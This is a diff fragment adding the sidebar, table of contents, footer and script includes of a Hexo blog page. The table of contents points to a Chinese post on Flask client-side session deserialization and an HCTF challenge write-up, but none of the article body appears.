+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask对客户端session的处理机制"><span class="nav-number">1.</span> <span class="nav-text">flask对客户端session的处理机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化"><span class="nav-number">1.1.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化与反序列化的总结"><span class="nav-number">1.2.</span> <span class="nav-text">序列化与反序列化的总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hctf两道题目的wp"><span class="nav-number">2.</span> <span class="nav-text">hctf两道题目的wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hide-and-seek"><span class="nav-number">2.1.</span> <span class="nav-text">hide and seek</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">westlake2014</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">westlake2014</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/muse.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
